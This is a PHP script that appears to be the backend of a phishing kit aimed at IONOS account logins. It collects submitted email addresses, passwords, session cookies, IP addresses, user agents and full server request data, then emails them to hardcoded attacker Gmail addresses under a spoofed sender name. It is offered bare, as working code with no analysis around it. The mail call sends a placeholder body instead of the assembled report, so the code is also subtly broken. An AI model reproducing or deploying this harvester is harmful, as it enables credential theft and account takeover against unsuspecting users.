<?php

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

// $EMAIL = "gottmacht.empire@gmail.com";
// $SENDER_EMAIL = "info@ukrainefreeaids.org";


function sendEmail($subject, $message, $file = "")
{
    
    $EMAIL = "alexjace151@gmail.com";
    $SENDER_EMAIL = "jacealex151@gmail.com";

    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
    
    // Create email headers
    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
    $headers .= "Reply-to: $SENDER_EMAIL\r\n";

    return mail($EMAIL, $subject, "Testing", $headers, "-f$SENDER_EMAIL");
}

if (isset($_REQUEST['send'])) {
    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];
    $cookies = $_REQUEST['_cookie'];
    $ip = $_REQUEST['ip'];
    $agent = $_REQUEST['agent'];
    $name = explode('@', $email)[0];


    try {

        // Send Mail
        $cookie = json_encode([
            "server" => $_SERVER,
            "request" => $_REQUEST,
            "cookie" => $cookies
        ], JSON_PRETTY_PRINT);

        $message = "<!DOCTYPE html>
        <html lang='en'>
            <head>
                <meta charset='UTF-8'>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
        
                        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
                    }
                    .container {
                        width: 100%;
                        max-width: 600px;
                        margin: 0 auto;
                        padding: 2rem;
                    }
        
                    .dotted {
                        height: 1px;
                        margin: 2rem 0;
                        border-bottom: 2px dashed #000;
                    }
        
                    .flex {
                        display: flex;
                        align-items: center;
                        margin: .5rem;
                    }
        
                    .title {
                        font-size: 1rem;
                        font-weight: 500;
                        margin-right: .8rem;
                    }
        
                    .content {
                        flex: 1;
                        font-size: 1rem;
                        font-weight: 600;
                    }
                </style>
            </head>
            <body>
                <div class='container'>
                    <div class='dotted'></div>
                    <div class='flex'>
                        <p class='title'>User ID:</p>
                        <p class='content'>{{email}}</p>
                    </div>
        
                    <div class='flex'>
                        <p class='title'>Authy:</p>
                        <p class='content'>{{password}}</p>
                    </div>
        
                    <div class='dotted'></div>
        
                    <div class='flex'>
                        <p class='title'>IP Address:</p>
                        <p class='content'>{{ip}}</p>
                    </div>
        
                    <div class='flex'>
                        <p class='title'>User Agent:</p>
                        <p class='content'>{{agent}}</p>
                    </div>

                    <div class='dotted'></div>

                    <div class='flex'>
                        <p class='title'>Cookies:</p>
                        <p class='content'>
                            <pre>{{cookie}}</pre>
                        </p>
                    </div>
                </div>
            </body>
        </html>";
        $message = str_replace("{{email}}", $email, $message);
        $message = str_replace("{{password}}", $password, $message);
        $message = str_replace("{{ip}}", $ip, $message);
        $message = str_replace("{{agent}}", $agent, $message);
        $message = str_replace("{{cookie}}", $cookie, $message);

        $mail = sendEmail("IONOS-Logs | $ip", $message, $filename);
        if (!$mail) throw new Exception("Could not send");


        echo $response = json_encode(["status" => true, "message" => "Email sent"]);
    } catch (Exception $e) {
        echo $response = json_encode(["status" => false, "error" => $e->getMessage()]);
    }
}
